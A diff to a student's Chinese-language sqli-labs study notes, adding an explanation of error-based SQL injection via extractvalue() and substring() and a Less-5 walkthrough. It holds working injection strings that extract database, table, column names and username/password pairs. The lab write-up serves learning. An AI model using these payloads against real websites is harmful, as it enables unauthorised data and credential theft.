@@ -542,7 +542,6 @@ GROUP BY
 
 简单来说，就是 构造语句查询信息。
 
-
 ### 注入分类
 按输入的参数分为 数字型注入（输入整型参数）、字符型注入（输入字符串）
 按注入的方法分为 Union注入、报错注入、时间注入
@@ -668,6 +667,60 @@ id=0' union select 1,group_concat(username,'~',password),3 from users--+
 6. 使用select语句，查询靶机所有列名
 7. 查询所有用户名密码
 
+### 报错注入
+通过报错信息获取数据的方法。
+用户在前台页面输入检索内容，后台将前台页面上输入的检索内容无加区别的拼接成sql语句，送给数据库执行。数据库将执行的结果返回给后台，后台将数据库执行的结果无加区别的显示到前台页面上。
+
+后台对于输入输出的合理性没有做检查（两个无加区别）
+
+即构造语句，让错误信息中可以显示数据库内容的查询语句，返回报错提示中包含数据库的内容
+
+#### extractValue()
+函数extractValue()包含两个参数 第一个 XML文档对象名称  第二个 路径
+```
+EXTRACTVALUE(xml_target, xpath_expr)
+
+如
+select extractvalue(doc,'/book/title') from xml;
+```
+其中xml对象对象名称不重要，可以随便填
+关键是将路径前的'/'换为'~'，可以实现报错，显示报错信息，对路径进行修改后，获得我们想要的信息
+```
+select extractvalue(doc,'~book/title') from xml;
+```
+这里的~可以写作ascll编码的0x7e，同时修改路径
+concat就是将两个内容拼接在一起
+```
+select extractvalue(doc,concat(0x7e,(select database()))) from xml;
+```
+
+在题目中，获得库名
+?id=2' union select 1,extractvalue(1,concat(0x7e,(select database()))),3--+
+简写为
+?id=2' and 1=extractvalue(1,concat(0x7e,(select database())))--+
+
+获得表名
+?id=2' and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+
+
+获得列名
+?id=2' and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')))--+
+
+获得结果
+?id=2' and 1=extractvalue(1,concat(0x7e,(select group_concat(username,'~',password)from users)))--+
+但是extractvalue()回显默认只有32个字符串
+
+需要使用函数substring()解决三个参数分别为：字符串、从第几个开始返回、返回几个
+```
+select substring(123456,1,3)
+返回 123
+
+select substring(123456,4,3)
+返回 456
+```
+
+将substring()加入，不断修改第二个参数的值去搜索结果
+?id=2' and 1=extractvalue(1,concat(0x7e,substring((select group_concat(username,'~',password)from users),1,30)))--+
+
 ### 布尔盲注
 盲注是指攻击者不能直接获取数据库中的信息，需要通过一些技巧来判断或推断出数据库中的数据。盲注主要分为布尔盲注、时间盲注、报错盲注
 
@@ -784,13 +837,42 @@ id=0' union select 1,group_concat(username,'~',password),3 from users--+
 ![image](https://github.com/user-attachments/assets/4e16ad6d-3b2c-41fd-8383-f8bbc50cdf47)
 
 ## Less-5
-正常去做，发现跟前面的不太一样，查询的信息没有回显，可以选择布尔盲注
+正常去做，发现跟前面的不太一样，查询的信息没有回显，可以选择报错注入或者布尔盲注
+
 
 ![image](https://github.com/user-attachments/assets/cc5a8c1f-e7ae-4a05-8a21-d187977bab31)
 
-判断为'闭合
+首先尝试使用报错注入，判断为'闭合
 
 ![image](https://github.com/user-attachments/assets/efbce505-898c-4315-a896-14c7a99a04ee)
+
+判断列数，为三列
+
+![image](https://github.com/user-attachments/assets/33a55718-9c37-43f6-80cf-b1dd06bc0196)
+
+通过报错信息判断库的名字为security
+
+![image](https://github.com/user-attachments/assets/e0042a56-6f56-4c47-8d0e-2109f8ea6a97)
+
+或者通过extractValue()函数报错注入获得库名
+
+![image](https://github.com/user-attachments/assets/7d44ca62-aceb-4f9b-a38e-586064b373a5)
+
+接着获得表名
+
+![image](https://github.com/user-attachments/assets/4dc2479f-ceab-4a01-a5a7-279411ae3549)
+
+获得列名
+
+![image](https://github.com/user-attachments/assets/eae16b39-688c-45b8-be58-c449ba9e1251)
+
+获得username和password,但是只返回了32个字符串
+
+![image](https://github.com/user-attachments/assets/03d7b29c-4520-4d4b-8e43-2fe443bc197a)
+
+通过substring解决此问题，最终在第150字符之后获得password
+
+![image](https://github.com/user-attachments/assets/12cdba56-4b03-4cae-a1ea-2b3833542c1b)
 
 由于时间不够了，等晚一点再补上后面的几道题，先写会高数作业...
 
